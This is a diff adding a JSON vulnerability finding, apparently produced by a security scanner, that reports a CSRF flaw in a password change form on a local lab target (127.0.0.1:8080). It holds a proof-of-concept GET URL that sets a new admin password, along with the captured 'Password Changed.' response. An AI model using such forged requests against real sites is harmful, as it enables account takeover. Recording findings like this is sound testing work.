@@ -1,0 +1,28 @@
+{
+  "id": "f_1784861790648_fa79c1",
+  "action": "confirm",
+  "title": "Cross-Site Request Forgery (CSRF) on password change",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+  "url": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+  "description": "The password change form at /vulnerabilities/csrf/ uses GET method with no CSRF token. An attacker can change the admin password by tricking an authenticated user into visiting a crafted URL.",
+  "poc": "The password change form at /vulnerabilities/csrf/ uses GET method with no CSRF token. An attacker can change the admin password by tricking an authenticated user into visiting: http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=attackerpass&password_conf=attackerpass&Change=Change",
+  "proof": "<pre>Password Changed.</pre>",
+  "how_captured": "GET http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change → 200",
+  "evidence_ids": [
+    "ev_1784861790623_63e01b"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784861790623_63e01b",
+      "excerpt": "<pre>Password Changed.</pre>",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "GET http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "8080",
+  "created_at": "2026-07-24T02:56:30.649Z"
+}
